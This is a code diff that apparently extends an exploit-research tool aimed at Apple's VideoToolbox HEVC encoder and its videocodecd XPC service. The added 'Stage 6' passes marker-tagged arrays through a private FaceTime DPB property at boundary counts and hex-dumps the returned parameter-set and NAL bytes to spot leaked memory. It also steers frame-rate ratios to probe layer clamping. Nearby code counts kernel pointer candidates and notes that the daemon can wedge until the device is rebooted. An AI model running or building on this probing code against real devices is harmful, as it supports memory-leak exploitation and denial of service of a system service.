@@ -80,6 +80,169 @@ static OSStatus KPH9CompleteStatus(VTCompressionSessionRef s, int timeoutMs) {
     return (w == 0) ? rc : INT32_MIN;
 }
 
+// === Stage 6: XPC Bitstream / NAL / Attachments Leak & Exact DPB Boundary ===
+// (analyst module, integrated; its bare CompleteFrames(kCMTimeInvalid) replaced
+// with a bounded poll - that call deadlocks on wedged sessions)
+typedef struct {
+    volatile int cbCount;
+    OSStatus lastStatus;
+    char summary[512];
+} Stage6ProbeResult;
+
+static NSString *HexDumpSlice(const uint8_t *buf, size_t len, size_t maxBytes) {
+    size_t n = (len < maxBytes) ? len : maxBytes;
+    NSMutableString *hex = [NSMutableString stringWithCapacity:n * 2];
+    for (size_t i = 0; i < n; i++) {
+        [hex appendFormat:@"%02x", buf[i]];
+    }
+    return hex;
+}
+
+static void Stage6OutputCallback(void *outputCallbackRefCon,
+                                 void *sourceFrameRefCon,
+                                 OSStatus status,
+                                 VTEncodeInfoFlags infoFlags,
+                                 CMSampleBufferRef sampleBuffer) {
+    Stage6ProbeResult *res = (Stage6ProbeResult *)outputCallbackRefCon;
+    if (!res) return;
+    res->cbCount++;
+    res->lastStatus = status;
+    if (status != noErr || !sampleBuffer) {
+        snprintf(res->summary, sizeof(res->summary),
+                 "cb#%d st=%d info=0x%x sbuf=NULL",
+                 res->cbCount, (int)status, (unsigned)infoFlags);
+        return;
+    }
+    // Real SampleAttachments (array of dicts - CMCopyDictionaryOfAttachments is empty)
+    CFArrayRef saArray = CMSampleBufferGetSampleAttachmentsArray(sampleBuffer, false);
+    NSUInteger saKeys = 0;
+    if (saArray && CFArrayGetCount(saArray) > 0) {
+        CFDictionaryRef dict = (CFDictionaryRef)CFArrayGetValueAtIndex(saArray, 0);
+        if (dict && CFGetTypeID(dict) == CFDictionaryGetTypeID()) {
+            saKeys = CFDictionaryGetCount(dict);
+        }
+    }
+    // VPS/SPS/PPS from CMFormatDescription (serialized inside VTEncoderXPCService)
+    CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(sampleBuffer);
+    size_t paramCount = 0;
+    NSString *spsHex = @"none";
+    if (fmt) {
+        CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 0, NULL, NULL, &paramCount, NULL);
+        const uint8_t *spsPtr = NULL;
+        size_t spsSize = 0;
+        if (CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 1, &spsPtr, &spsSize, NULL, NULL) == noErr && spsPtr) {
+            spsHex = HexDumpSlice(spsPtr, spsSize, 24);
+        }
+    }
+    // First bytes of the Slice NAL (short-term RPS header lives here)
+    CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sampleBuffer);
+    NSString *nalHex = @"none";
+    size_t totalLen = 0;
+    if (block) {
+        char *dataPtr = NULL;
+        size_t lengthAtOffset = 0;
+        if (CMBlockBufferGetDataPointer(block, 0, &lengthAtOffset, &totalLen, &dataPtr) == noErr && dataPtr) {
+            nalHex = HexDumpSlice((const uint8_t *)dataPtr, lengthAtOffset, 24);
+        }
+    }
+    snprintf(res->summary, sizeof(res->summary),
+             "cb#%d st=%d info=0x%x saKeys=%lu ps=%zu sps=%s nal(%zu)=%s",
+             res->cbCount, (int)status, (unsigned)infoFlags,
+             (unsigned long)saKeys, paramCount,
+             [spsHex UTF8String], totalLen, [nalHex UTF8String]);
+}
+
+static CVPixelBufferRef CreateDummyNV12Buffer(int width, int height) {
+    CVPixelBufferRef px = NULL;
+    NSDictionary *attrs = @{
+        (id)kCVPixelBufferIOSurfacePropertiesKey : @{}
+    };
+    CVPixelBufferCreate(kCFAllocatorDefault, width, height,
+                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
+                        (__bridge CFDictionaryRef)attrs, &px);
+    return px;
+}
+
+static void RunStage6_XPCLeakAndBoundaryAudit(NSMutableString *log) {
+    [log appendString:@"\n--- Stage 6: DPB Exact Boundary (1..15, 34..48) & Bitstream/NAL Leak Audit ---\n"];
+    int probeCounts[] = {
+        1, 2, 3, 4, 8, 15,
+        34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48
+    };
+    size_t numProbes = sizeof(probeCounts) / sizeof(probeCounts[0]);
+    CVPixelBufferRef px = CreateDummyNV12Buffer(192, 144);
+    if (!px) {
+        [log appendString:@"  [!] Failed to allocate CVPixelBuffer\n"];
+        return;
+    }
+    for (size_t i = 0; i < numProbes; i++) {
+        int count = probeCounts[i];
+        Stage6ProbeResult res = {0};
+        snprintf(res.summary, sizeof(res.summary), "(no cb)");
+        VTCompressionSessionRef session = NULL;
+        OSStatus st = VTCompressionSessionCreate(
+            kCFAllocatorDefault, 192, 144,
+            kCMVideoCodecType_HEVC, NULL, NULL, NULL,
+            Stage6OutputCallback, &res, &session);
+        if (st != noErr || !session) {
+            [log appendFormat:@"  dpb[x%-2d] create=%d\n", count, (int)st];
+            continue;
+        }
+        NSMutableArray *dpbArr = [NSMutableArray arrayWithCapacity:count];
+        for (int k = 0; k < count; k++) {
+            uint64_t tagged = 0x4141414141410000ULL | (uint64_t)k;
+            CFNumberRef num = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &tagged);
+            [dpbArr addObject:(__bridge_transfer id)num];
+        }
+        OSStatus setSt = VTSessionSetProperty(
+            session,
+            CFSTR("UserDPBFramesForFaceTime"),
+            (__bridge CFTypeRef)dpbArr);
+        VTCompressionSessionPrepareToEncodeFrames(session);
+        CMTime pts0 = CMTimeMake(0, 30);
+        CMTime pts1 = CMTimeMake(1, 30);
+        VTCompressionSessionEncodeFrame(session, px, pts0, kCMTimeInvalid, NULL, NULL, NULL);
+        VTCompressionSessionEncodeFrame(session, px, pts1, kCMTimeInvalid, NULL, NULL, NULL);
+        // Bounded wait for the 2 callbacks - never CompleteFrames(kCMTimeInvalid).
+        int waited = 0;
+        while (res.cbCount < 2 && waited < 300) { usleep(2000); waited += 2; }
+        [log appendFormat:@"  dpb[tagged x%-2d] set=%-6d -> %s\n",
+                          count, (int)setSt, res.summary];
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+    }
+    // 6B: NTL clamp steering via extreme ExpectedFrameRate / BaseLayerFrameRate ratios
+    [log appendString:@"  [6B: Dyadic Clamp Ratio Steering (ExpectedFrameRate / BaseLayerFrameRate)]\n"];
+    double baseRates[] = { 15.0, 7.5, 3.75, 1.0, 0.5, 0.25, 0.0625 };
+    for (size_t i = 0; i < sizeof(baseRates) / sizeof(baseRates[0]); i++) {
+        VTCompressionSessionRef session = NULL;
+        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144,
+                                       kCMVideoCodecType_HEVC, NULL, NULL, NULL,
+                                       Stage6OutputCallback, NULL, &session) == noErr && session) {
+            int expFps = 240;
+            double baseFps = baseRates[i];
+            CFNumberRef nExp = CFNumberCreate(NULL, kCFNumberIntType, &expFps);
+            CFNumberRef nBase = CFNumberCreate(NULL, kCFNumberDoubleType, &baseFps);
+            VTSessionSetProperty(session, kVTCompressionPropertyKey_ExpectedFrameRate, nExp);
+            VTSessionSetProperty(session, kVTCompressionPropertyKey_BaseLayerFrameRate, nBase);
+            OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
+            CFNumberRef postNtlRef = NULL;
+            int postNtl = -1;
+            if (VTSessionCopyProperty(session, CFSTR("NumberOfTemporalLayers"), NULL, &postNtlRef) == noErr && postNtlRef) {
+                CFNumberGetValue(postNtlRef, kCFNumberIntType, &postNtl);
+                CFRelease(postNtlRef);
+            }
+            [log appendFormat:@"  ratio 240/%.4f -> prep=%d POST_NTL=%d\n",
+                              baseFps, (int)prepSt, postNtl];
+            CFRelease(nExp);
+            CFRelease(nBase);
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+        }
+    }
+    CVPixelBufferRelease(px);
+}
+
 static CVPixelBufferRef KPH9CreatePixelBuffer(int width, int height) {
     CVPixelBufferRef pb = NULL;
     if (CVPixelBufferCreate(kCFAllocatorDefault, width, height,
@@ -527,6 +690,22 @@ static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimed
         addr += size;
     }
     [report appendFormat:@"  filtered kernel pointer candidates: %d\n", candidates];
+
+    // -------------------------------------------------------------------------
+    // Stage 6: XPC bitstream / NAL / attachments leak + exact DPB boundary
+    // -------------------------------------------------------------------------
+    [self journal:@"Stage 6: XPC bitstream leak & DPB boundary"];
+    if (vtHung) {
+        [report appendString:@"\n--- Stage 6 skipped (videocodecd XPC timed out) ---\n"];
+    } else {
+        NSString *s6 = KPH9RunTimed(@"Stage6-XPC", 15000, &vtHung, ^NSString *{
+            NSMutableString *out = [NSMutableString string];
+            RunStage6_XPCLeakAndBoundaryAudit(out);
+            return out;
+        });
+        [report appendString:s6];
+    }
+
     [report appendFormat:@"\nVERDICT: %@\n", vtHung ? @"VIDEOCODECD_XPC_TIMEOUT (reboot device to clear wedged daemon)" : @"COMPLETED_CLEAN"];
 
     [self journal:@"=== H9 clean rebuild complete ==="];
